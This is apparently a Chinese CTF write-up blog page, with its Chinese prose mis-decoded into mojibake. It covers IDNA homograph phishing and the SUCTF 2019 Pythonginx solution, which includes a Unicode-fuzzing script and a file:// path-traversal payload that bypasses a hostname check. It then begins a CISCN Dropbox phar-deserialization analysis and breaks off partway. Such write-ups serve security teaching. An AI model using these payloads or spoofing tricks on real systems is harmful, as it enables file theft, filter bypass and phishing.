<h2 id="Unicode-ç¼–ç "><a href="#Unicode-ç¼–ç " class="headerlink" title="Unicode ç¼–ç "></a>Unicode ç¼–ç </h2><p>ä¸­æ–‡ååˆå«<strong>ä¸‡å›½ç ,å›½é™…ç ,ç»Ÿä¸€ç ,å•ä¸€ç </strong>.æ˜¯è®¡ç®—æœºç§‘å­¦é¢†åŸŸé‡Œçš„ä¸€é¡¹ä¸šç•Œæ ‡å‡†ã€‚å®ƒå¯¹ä¸–ç•Œä¸Šå¤§éƒ¨åˆ†çš„æ–‡å­—ç³»ç»Ÿè¿›è¡Œäº†æ•´ç†ã€ç¼–ç ï¼Œä½¿å¾—è®¡ç®—æœºå¯ä»¥ç”¨æ›´ä¸ºç®€å•çš„æ–¹å¼æ¥å‘ˆç°å’Œå¤„ç†æ–‡å­—ã€‚Unicodeæ¶µç›–çš„æ•°æ®é™¤äº†è§†è§‰ä¸Šçš„å­—å½¢ã€ç¼–ç æ–¹æ³•ã€æ ‡å‡†çš„å­—ç¬¦ç¼–ç å¤–ï¼Œè¿˜åŒ…å«äº†å­—ç¬¦ç‰¹æ€§ï¼Œå¦‚å¤§å°å†™å­—æ¯ã€‚ç›®å‰å·²ç»æœ‰è¶…è¿‡ 13 ä¸‡ä¸ªå­—ç¬¦</p>
<h2 id="ASCII-ç¼–ç "><a href="#ASCII-ç¼–ç " class="headerlink" title="ASCII ç¼–ç "></a>ASCII ç¼–ç </h2><p>ASCIIï¼ˆAmerican Standard Code for Information  Interchangeï¼Œç¾å›½ä¿¡æ¯äº¤æ¢æ ‡å‡†ä»£ç ï¼‰æ˜¯åŸºäºæ‹‰ä¸å­—æ¯çš„ä¸€å¥—ç”µè„‘ç¼–ç ç³»ç»Ÿï¼Œå®ƒä¸»è¦ç”¨äºæ˜¾ç¤ºç°ä»£è‹±è¯­ï¼Œè€Œå…¶æ‰©å±•ç‰ˆæœ¬EASCIIåˆ™å¯ä»¥éƒ¨åˆ†æ”¯æŒå…¶ä»–è¥¿æ¬§è¯­è¨€ï¼Œå¹¶ç­‰åŒäºå›½é™…æ ‡å‡†ISO/IEC 646ã€‚</p>
<p>è‡³ä»Šä¸ºæ­¢å…±å®šä¹‰äº†128ä¸ªå­—ç¬¦ï¼›å…¶ä¸­<strong>33ä¸ªå­—ç¬¦æ— æ³•æ˜¾ç¤º</strong>ï¼ˆä¸€äº›ç»ˆç«¯æä¾›äº†æ‰©å±•ï¼Œä½¿å¾—è¿™äº›å­—ç¬¦å¯æ˜¾ç¤ºä¸ºè¯¸å¦‚ç¬‘è„¸ã€æ‰‘å…‹ç‰ŒèŠ±å¼ç­‰8-bitç¬¦å·ï¼‰ï¼Œä¸”è¿™33ä¸ªå­—ç¬¦å¤šæ•°éƒ½å·²æ˜¯<strong>é™ˆåºŸçš„æ§åˆ¶å­—ç¬¦</strong>ã€‚æ§åˆ¶å­—ç¬¦çš„ç”¨é€”ä¸»è¦æ˜¯ç”¨æ¥æ“æ§å·²ç»å¤„ç†è¿‡çš„æ–‡å­—ã€‚åœ¨33ä¸ªå­—ç¬¦ä¹‹å¤–çš„æ˜¯95ä¸ªå¯æ˜¾ç¤ºçš„å­—ç¬¦ã€‚ç”¨é”®ç›˜æ•²ä¸‹ç©ºç™½é”®æ‰€äº§ç”Ÿçš„ç©ºç™½å­—ç¬¦ä¹Ÿç®—1ä¸ªå¯æ˜¾ç¤ºå­—ç¬¦ï¼ˆæ˜¾ç¤ºä¸ºç©ºç™½ï¼‰ã€‚</p>
<p>ä¹Ÿå°±æ˜¯è¯´: ASCII ç ç”± : <strong>ASCII æ‰“å°å­—ç¬¦, ASCII éæ‰“å°æ§åˆ¶å­—ç¬¦, æ‰©å±•ASCII æ‰“å°å­—ç¬¦</strong></p>
<h2 id="Urlä¸­çš„Unicodeæ¼æ´å¼•å‘çš„åŸŸåå®‰å…¨é—®é¢˜"><a href="#Urlä¸­çš„Unicodeæ¼æ´å¼•å‘çš„åŸŸåå®‰å…¨é—®é¢˜" class="headerlink" title="Urlä¸­çš„Unicodeæ¼æ´å¼•å‘çš„åŸŸåå®‰å…¨é—®é¢˜"></a>Urlä¸­çš„Unicodeæ¼æ´å¼•å‘çš„åŸŸåå®‰å…¨é—®é¢˜</h2><p>è§å‚è€ƒèµ„æ–™[1]</p>
<h3 id="åŸŸåæ¬ºéª—"><a href="#åŸŸåæ¬ºéª—" class="headerlink" title="åŸŸåæ¬ºéª—"></a>åŸŸåæ¬ºéª—</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;Ğ’aidu.com å…¶ä¸­çš„B æ˜¯(unicode U+0412)</span><br></pre></td></tr></table></figure>

<p>è®¿é—®è¿™ä¸ªURL, ä¼šè·³è½¬åˆ° <code>http://www.xn--aidu-f4d.com/</code></p>
<p><code>xn</code>:ACE(è¿™æ˜¯ä¸€ä¸ªå›½é™…åŒ–åŸŸåç¼–ç )</p>
<p><code>aidu</code>:ASCIIç </p>
<p><code>f4d</code>:çŠ¶æ€æœºæŒ‡ä»¤</p>
<p>è®¿é—®ç»è¿‡æ„é€ çš„URLæ—¶,è¿‡ç¨‹æ˜¯è¿™æ ·çš„: </p>
<blockquote>
<p>æµè§ˆå™¨ä¼šå°†æˆ‘ä»¬è®¿é—®çš„urläº¤ç»™åŸŸåç³»ç»Ÿ(DNS)è§£æurlä¸ºipåœ°å€ï¼Œåœ¨<strong>è§£æurlçš„è¿‡ç¨‹</strong>ä¸­é‡‡ç”¨é€’å½’æŸ¥è¯¢å’Œè¿­ä»£æŸ¥è¯¢ï¼Œå³<strong>å…ˆé€’å½’æœç´¢æµè§ˆå™¨è‡ªå·±çš„çš„dnsç¼“å­˜ï¼Œç„¶åæœç´¢æ“ä½œç³»ç»Ÿçš„dnsç¼“å­˜ï¼Œæ¥ç€æœç´¢hostsæ–‡ä»¶ç¼“å­˜ï¼Œæœç´¢æœ¬åœ°åŸŸåæœåŠ¡å™¨ï¼Œç„¶åè¿­ä»£æœç´¢æ ¹åŸŸåæœåŠ¡å™¨â€¦â€¦ï¼Œç›´åˆ°æ‰¾åˆ°ipåœ°å€</strong>ä¸ºæ­¢ï¼Œæ‰¾ä¸åˆ°å°±è¿”å›404notfoundï¼Œè€Œåœ¨DNSä¸­ï¼Œ<strong>å›½é™…åŒ–åŸŸå(IDNA)ä½¿ç”¨Punycodeè½¬å†™å¹¶ä»¥ç¾å›½ä¿¡æ¯äº¤æ¢æ ‡å‡†ä»£ç ï¼ˆASCIIï¼‰å­—ç¬¦ä¸²å‚¨å­˜ã€‚åœ¨æœ¬åœ°DNSä¸­ï¼Œå› ä¸ºé‡è§ç‰¹æ®Šå­—ç¬¦Ğ’ï¼Œè€Œæ— æ³•å°†æ­¤urlæ­£å¸¸è½¬åŒ–ä¸ºASCIIï¼Œå› æ­¤å°±ç›´æ¥åœ¨æœ¬åœ°è½¬åŒ–</strong>ä¸º<code>http://xn--aidu-f4d.com/</code>è¿™ç§å½¢å¼çš„urlã€‚</p>
</blockquote>
<p><strong>IDNAè½¬å†™ASCIIçš„è¿‡ç¨‹åˆåˆ†ä¸ºä¸¤æ­¥</strong></p>
<p><strong>1. Normalization</strong></p>
<p>Convert characters to a â€œstandardized formâ€.</p>
<p>ç¬¬ä¸€æ­¥ï¼šæ­£å¸¸åŒ–ï¼Œå°†å­—ç¬¦è½¬åŒ–ä¸ºæ ‡å‡†å½¢å¼</p>
<p>ä¾‹å¦‚ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ã… (U+00C5),Ã… (U+212B),Ã… (U+0041, U+030A)å°†ä¼šè¢«æ ‡å‡†åŒ–ä¸ºÃ¥ (U+00E5)</span><br></pre></td></tr></table></figure>

<p><strong>2. Punycoding</strong></p>
<p>Turn Unicode into ASCII.</p>
<p>ç¬¬äºŒæ­¥ï¼šç”¨punycodeç¼–ç å°†unicodeç¼–ç æˆASCIIç </p>
<p>ç°åœ¨æˆ‘ä»¬å·²ç»çŸ¥é“ï¼Œåœ¨æˆ‘ä»¬è®¿é—®åŸŸå<code>http://Ğ’aidu.com</code>æ—¶ï¼Œæµè§ˆå™¨ä¼šå°†æ­¤unicodeè½¬åŒ–ä¸ºASCIIç ï¼Œç„¶åè®¿é—®<code>http://xn--aidu-f4d.com/</code>,å¦‚æœæˆ‘ä»¬æ³¨å†Œäº†<code>http://xn--aidu-f4d.com/</code>è¿™ä¸ªåŸŸåï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å°†è®¿é—®<code>http://Ğ’aidu.com</code>çš„å—å®³è€…è½¬åˆ°è¿™ä¸ªåŸŸåä¸‹ï¼Œä»è€Œå®ç°<strong>é’“é±¼æ”»å‡»</strong>ã€‚</p>
<h3 id="åŸŸååˆ†å‰²"><a href="#åŸŸååˆ†å‰²" class="headerlink" title="åŸŸååˆ†å‰²"></a>åŸŸååˆ†å‰²</h3><p>è®¿é—®: </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;evil.câ„€a.aaa.com </span><br></pre></td></tr></table></figure>

<p>æµè§ˆå™¨ä¼šè®¿é—®: </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;evil.ca&#x2F;ca.aaa.com</span><br></pre></td></tr></table></figure>

<p>unicodeä¸­è¿˜æœ‰ä¸€ç§å­—ç¬¦<code>â„€</code>(U+2100)ï¼Œå½“IDNAå¤„ç†æ­¤å­—ç¬¦æ—¶ï¼Œä¼šå°†<code>â„€</code>å˜æˆa/cï¼Œå› æ­¤å½“ä½ è®¿é—®æ­¤urlæ—¶ï¼ŒdnsæœåŠ¡å™¨ä¼šè‡ªåŠ¨å°†urlé‡å®šå‘åˆ°å¦ä¸€ä¸ªç½‘ç«™ã€‚å¦‚æœæœåŠ¡å™¨å¼•ç”¨å‰ç«¯urlæ—¶ï¼Œåªå¯¹åŸŸååšäº†é™åˆ¶ï¼Œé‚£ä¹ˆé€šè¿‡è¿™ç§æ–¹æ³•ï¼Œæˆ‘ä»¬å°±å¯ä»¥è½»æ¾ç»•è¿‡æœåŠ¡å™¨å¯¹åŸŸåçš„é™åˆ¶äº†ã€‚</p>
<p>unicodeè½¬ASCIIå‘ç”Ÿåœ¨IDNAä¸­çš„TOASCIIæ“ä½œä¸­ã€‚å¦‚æœèƒ½é€šè¿‡TOASCIIè½¬æ¢æ—¶ï¼Œå°†ä¼šä»¥æ­£å¸¸çš„å­—ç¬¦å‘ˆç°ã€‚è€Œ<strong>å¦‚æœä¸èƒ½é€šè¿‡TOASCIIè½¬æ¢æ—¶ï¼Œå°±ä¼šä½¿ç”¨â€œACEæ ‡ç­¾â€ï¼Œâ€œACEâ€æ ‡ç­¾ä½¿è¾“å…¥çš„åŸŸåèƒ½è½¬åŒ–ä¸ºASCIIç </strong></p>
<p>å…¶ä»–å¯åˆ©ç”¨çš„unicode å­—ç¬¦: </p>
<p>U+2100, <code>â„€</code>      U+2101, <code>â„</code>        U+2105, <code>â„…</code>    U+2106, <code>â„†</code>    U+FF0F,<code>ï¼</code>    U+2047, <code>â‡</code>    U+2048, <code>âˆ</code>   U+2049, <code>â‰</code></p>
<p>U+FE16, <code>ï¸–</code>     U+FE56, <code>ï¹–</code>   U+FF1F,<code>ï¼Ÿ</code>    U+FE5F, <code>ï¹Ÿ</code>    U+FF03, <code>ï¼ƒ</code>      U+FE6B, <code>ï¹«</code>    U+FF20, <code>ï¼ </code></p>
<h2 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h2><p>å‚è€ƒèµ„æ–™: <a target="_blank" rel="noopener" href="https://www.cnblogs.com/liang-io/p/9340335.html">https://www.cnblogs.com/liang-io/p/9340335.html</a></p>
<p>Nginx æ˜¯ä¸€æ¬¾<strong>è½»é‡çº§çš„Web  æœåŠ¡å™¨ï¼åå‘ä»£ç†æœåŠ¡å™¨åŠç”µå­é‚®ä»¶ï¼ˆIMAP/POP3ï¼‰ä»£ç†æœåŠ¡å™¨</strong>ï¼Œå¹¶åœ¨ä¸€ä¸ªBSD-like åè®®ä¸‹å‘è¡Œã€‚ç”±ä¿„ç½—æ–¯çš„ç¨‹åºè®¾è®¡å¸ˆIgor  Sysoevæ‰€å¼€å‘ï¼Œæœ€åˆä¾›ä¿„å›½å¤§å‹çš„å…¥å£ç½‘ç«™åŠæœå¯»å¼•æ“Ramblerï¼ˆä¿„æ–‡ï¼šĞ Ğ°Ğ¼Ğ±Ğ»ĞµÑ€ï¼‰ä½¿ç”¨ã€‚ å…¶ç‰¹ç‚¹æ˜¯å æœ‰<strong>å†…å­˜å°‘ï¼Œå¹¶å‘èƒ½åŠ›å¼º.</strong></p>
<p>Nginx é‡è¦æ–‡ä»¶é…ç½®: </p>
<ul>
<li><p>conf ç›®å½•æ˜¯ nginx æ‰€æœ‰é…ç½®æ–‡ä»¶çš„ç›®å½• ,nginx.conf æ˜¯nginx é»˜è®¤çš„ä¸»é…ç½®æ–‡ä»¶</p>
</li>
<li><p>é…ç½®æ–‡ä»¶å­˜æ”¾ç›®å½•ï¼š/etc/nginx</p>
</li>
<li><p>ä¸»é…ç½®æ–‡ä»¶ï¼š/etc/nginx/conf/nginx.conf æˆ– /etc/nginx/nginx.conf</p>
</li>
<li><p>ç®¡ç†è„šæœ¬ï¼š/usr/lib64/systemd/system/nginx.service</p>
</li>
<li><p>æ¨¡å—ï¼š/usr/lisb64/nginx/modules</p>
</li>
<li><p>åº”ç”¨ç¨‹åºï¼š/usr/sbin/nginx</p>
</li>
<li><p>ç¨‹åºé»˜è®¤å­˜æ”¾ä½ç½®ï¼š/usr/share/nginx/html</p>
</li>
<li><p>æ—¥å¿—é»˜è®¤å­˜æ”¾ä½ç½®ï¼š/var/log/nginx</p>
</li>
</ul>
<h2 id="è§£é¢˜è¿‡ç¨‹"><a href="#è§£é¢˜è¿‡ç¨‹" class="headerlink" title="è§£é¢˜è¿‡ç¨‹"></a>è§£é¢˜è¿‡ç¨‹</h2><p>å¤§å¸ˆå‚…çš„éé¢„æœŸ: <code>/getUrl?url=file:////suctf.cc/../../../../../usr/fffffflag</code> </p>
<p>åŸç†: </p>
<p>å‚è€ƒèµ„æ–™ <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6281">https://xz.aliyun.com/t/6281</a></p>
<p>Python <code>urlunsplit()</code>å‡½æ•°æºç </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">urlunsplit</span>(<span class="params">components</span>):</span></span><br><span class="line">    scheme, netloc, url, query, fragment, _coerce_result = (</span><br><span class="line">                                          _coerce_args(*components))</span><br><span class="line">    <span class="keyword">if</span> netloc <span class="keyword">or</span> (scheme <span class="keyword">and</span> scheme <span class="keyword">in</span> uses_netloc <span class="keyword">and</span> url[:<span class="number">2</span>] != <span class="string">&#x27;//&#x27;</span>):</span><br><span class="line">        <span class="keyword">if</span> url <span class="keyword">and</span> url[:<span class="number">1</span>] != <span class="string">&#x27;/&#x27;</span>: url = <span class="string">&#x27;/&#x27;</span> + url</span><br><span class="line">        url = <span class="string">&#x27;//&#x27;</span> + (netloc <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span>) + url</span><br><span class="line">    <span class="keyword">if</span> scheme:</span><br><span class="line">        url = scheme + <span class="string">&#x27;:&#x27;</span> + url</span><br><span class="line">    <span class="keyword">if</span> query:</span><br><span class="line">        url = url + <span class="string">&#x27;?&#x27;</span> + query</span><br><span class="line">    <span class="keyword">if</span> fragment:</span><br><span class="line">        url = url + <span class="string">&#x27;#&#x27;</span> + fragment</span><br><span class="line">    <span class="keyword">return</span> _coerce_result(url)</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªå‡½æ•°çš„ç”¨æ³•å’ŒPHPä¸­çš„<code>parse_url()</code> å¾ˆåƒ, éƒ½æ˜¯å°†URLä¸­çš„å„ä¸ªéƒ¨åˆ†ç»„æˆä¸€ä¸ªåˆ—è¡¨list(æ•°ç»„array)</p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200225171939.png"></p>
<p>é¢„æœŸ: </p>
<p>Python èœ,ç›´æ¥(ï½ï¿£â–½ï¿£)å«–è„šæœ¬, ä»¥åå†ç ”ç©¶</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlunsplit, urlsplit</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_unicode</span>():</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">65536</span>):</span><br><span class="line">        uni = chr(x)</span><br><span class="line">        url = <span class="string">&quot;http://suctf.c&#123;&#125;&quot;</span>.format(uni)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> getUrl(url):</span><br><span class="line">                print(<span class="string">&quot;str: &quot;</span> + uni + <span class="string">&#x27; unicode: \\u&#x27;</span> + str(hex(x))[<span class="number">2</span>:])</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUrl</span>(<span class="params">url</span>):</span></span><br><span class="line">    url = url</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    parts = list(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">&#x27;idna&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">&#x27;.&#x27;</span>.join(newhost)</span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">&#x27; &#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    get_unicode()</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ç”¨è¿™äº›å»ä»£æ›¿suctf.ccä¸­æœ€åé‚£ä¸ªcå³å¯</span><br><span class="line">str: â„‚ unicode: \u2102</span><br><span class="line">str: â„­ unicode: \u212d</span><br><span class="line">str: â…­ unicode: \u216d</span><br><span class="line">str: â…½ unicode: \u217d</span><br><span class="line">str: â’¸ unicode: \u24b8</span><br><span class="line">str: â“’ unicode: \u24d2</span><br><span class="line">str: ï¼£ unicode: \uff23</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200225164852.png"></p>
<p>åˆ©ç”¨file://åè®®è¯»æ–‡ä»¶, ç„¶å è¿™ä¸ª <code>alias</code> æ˜¯åœ¨nginx ä¸­,ç”¨æ¥è®¾ç½®è™šæ‹Ÿç›®å½•ç”¨çš„,aliasæŒ‡å®šçš„ç›®å½•æ˜¯å‡†ç¡®çš„ï¼Œå³<strong>locationåŒ¹é…è®¿é—®çš„pathç›®å½•ä¸‹çš„æ–‡ä»¶ç›´æ¥æ˜¯åœ¨aliasç›®å½•ä¸‹æŸ¥æ‰¾çš„</strong></p>
<p>è¯´æ˜ <code>/flag</code> ç›´æ¥åœ¨ <code>/usr/fffffflag</code> ä¸­è¯»å–</p>
<p><code>/getUrl?url=file://suctf.c%E2%85%AD/usr/fffffflag </code> å³å¯è¯»å–flag</p>
<p>å†æ¥åˆ†æä¸€ä¸‹åŸç†: </p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200225170142.png"></p>
<ol>
<li><p>åœ¨å‰é¢ä¸¤ä¸ª if åˆ¤æ–­ host æ˜¯å¦ä¸º suctf.cc æ—¶, å› ä¸º <code>suctf.câ…­</code> æ‰€ä»¥æˆåŠŸç»•è¿‡</p>
</li>
<li><p>ç„¶åå¯¹host è¿›è¡Œ idnaç¼–ç  å†è¿›è¡Œ utf-8 è§£ç  è¿™å°±å¯¼è‡´äº†æ¼æ´çš„å‡ºç°.</p>
</li>
</ol>
<p>å½“ä¼ å…¥<code>â„†</code> è¿™ä¸ªä¸ºæœ€åä¸€ä¸ªc,æœ€åç¬¬ä¸‰éƒ¨å°±æˆä¸ºäº†<code>suctf.cc/u</code>ç„¶åå°±å¯ä»¥è¯»å– <code>usr</code>ç›®å½•ä¸‹çš„æ•æ„Ÿæ–‡ä»¶.</p>
<p>å‚è€ƒèµ„æ–™: </p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6070">https://xz.aliyun.com/t/6070</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6057">https://xz.aliyun.com/t/6057</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6281">https://xz.aliyun.com/t/6281</a></p>
<p><a target="_blank" rel="noopener" href="https://bugs.python.org/issue36216">https://bugs.python.org/issue36216</a></p>
<p><a target="_blank" rel="noopener" href="https://lihuaiqiu.github.io/2019/08/27/SUCTF2019/">https://lihuaiqiu.github.io/2019/08/27/SUCTF2019/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/11470200.html#cve-2019-9636urlsplit%E4%B8%8D%E5%A4%84%E7%90%86nfkc%E6%A0%87%E5%87%86%E5%8C%96">https://www.cnblogs.com/20175211lyz/p/11470200.html#cve-2019-9636urlsplit%E4%B8%8D%E5%A4%84%E7%90%86nfkc%E6%A0%87%E5%87%86%E5%8C%96</a></p>
<p><a target="_blank" rel="noopener" href="https://xi4or0uji.github.io/2019/08/25/2019-SUCTF-wp/#Pythonginx">https://xi4or0uji.github.io/2019/08/25/2019-SUCTF-wp/#Pythonginx</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42181428/article/details/99741920">https://blog.csdn.net/qq_42181428/article/details/99741920</a></p>
<h1 id="CISCN2019-ååŒ—èµ›åŒº-Day1-Web1-Dropbox"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day1-Web1-Dropbox" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day1 Web1]Dropbox"></a>[CISCN2019 ååŒ—èµ›åŒº Day1 Web1]Dropbox</h1><ul>
<li><p>ä»»æ„æ–‡ä»¶ä¸‹è½½</p>
</li>
<li><p>phar ååºåˆ—åŒ– </p>
</li>
</ul>
<p>å› ä¸ºæ³¨å†Œ(register.php)è´¦å·å,åªæœ‰ä¸€ä¸ªä¸Šä¼ (upload.php)å›¾ç‰‡,æŠ“åŒ…è¯•è¯•çœ‹åˆ é™¤,å‡ºç°äº†delete.php</p>
<p>æœ¬æ¥æƒ³è¯•è¯•æ‰«ç›®å½•çš„,æŒ‰ç†è¯´åº”è¯¥å¯ä»¥æ‰«åˆ° download.php ,ä½†æ˜¯çŒœä¹Ÿåº”è¯¥æœ‰ä¸‹è½½åŠŸèƒ½,ä»é¢˜ç›®(äº‘ç›˜),é‚£åº”è¯¥ä¹Ÿæœ‰downloadå§!!!</p>
<p>ä¾æ¬¡ä¸‹è½½ index,login,class,downloadçš„PHPæºç  , ç„¶åè¿›è¡Œä»£ç å®¡è®¡</p>
<p>åœ¨class.php ä¸­çš„ ç¬¬<code>158</code> è¡Œ,å­˜åœ¨æ–‡ä»¶è¯»å–å‡½æ•°<code>file_get_contents()</code> </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename); <span class="comment">// åœ¨File ç±»</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$func, $args</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    array_push(<span class="keyword">$this</span>-&gt;func, $func);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// åœ¨95,96 è¡Œå­˜åœ¨ __call()é­”æ³•å‡½æ•°,è¯¥å‡½æ•°ç”¨äºç›‘è§†å¯¹è±¡ä¸­çš„å…¶ä»–æ–¹æ³•,å½“å»è°ƒç”¨ä¸€ä¸ªå¯¹è±¡ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•æ—¶,è¯¥å‡½æ•°å°±ä¼šè¢«è§¦å‘</span></span><br></pre></td></tr></table></figure>

<p>ç„¶åä¹‹å‰å­¦åˆ°è¿‡,Phar ååºåˆ—åŒ–ä¼šå½±å“åˆ°è¯¥å‡½æ•°,è¿™é‡Œä¸ºä»€ä¹ˆä¼šæƒ³åˆ°ååºåˆ—åŒ–å‘¢?å¹¶ä¸”æ²¡æœ‰<code>serialize()</code>åºåˆ—åŒ–å’Œ<code>unserialize()</code> ååºåˆ—åŒ–å‡½æ•°</p>
<p>ç„¶åå°† <code>158</code>è¡Œçš„ filename è¿›è¡Œè·Ÿè¸ª, æ˜¯å±äº <code>File</code> ç±»çš„, æ—¢ç„¶è¦æƒ³è¯»å–æ–‡ä»¶,åˆæ˜¯å…³äºé¢å‘å¯¹è±¡çš„,åˆæ²¡æœ‰åºåˆ—åŒ–ç›¸å…³çš„å‡½æ•°,æ‰€ä»¥åªæœ‰phar ååºåˆ—, è¯¥ååºåˆ—åŒ–ä¸éœ€è¦åºåˆ—åŒ–ç›¸å…³çš„å‡½æ•°éƒ½èƒ½è¿›è¡Œ</p>
<p>åœ¨<code>login.php</code> ä¸­çš„<code>71,72,73</code> å¾—åˆ°æ²™ç®±çš„æ–‡ä»¶è·¯å¾„,ä½†æ˜¯åšè¿™é“é¢˜æ²¡æœ‰ç”¨å¤„</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sandbox = <span class="string">&quot;uploads/&quot;</span> . sha1($_SESSION[<span class="string">&#x27;username&#x27;</span>] . <span class="string">&quot;sftUahRiTz&quot;</span>) . <span class="string">&quot;/&quot;</span>; <span class="comment">// ä¸Šä¼ æ–‡ä»¶çš„è·¯å¾„ä¸ºuploads/sha1(&#x27;username&#x27;)sftUahRiTz/</span></span><br><span class="line"><span class="keyword">if</span> (!is_dir($sandbox)) &#123; <span class="comment">// å¦‚æœä¸å­˜åœ¨sandbox çš„è·¯å¾„,å°±åˆ›å»º</span></span><br><span class="line">    mkdir($sandbox);</span><br></pre></td></tr></table></figure>

<p>åœ¨<code>download.php</code> ä¸­çš„ç¬¬<code>13</code>è¡Œ: </p>
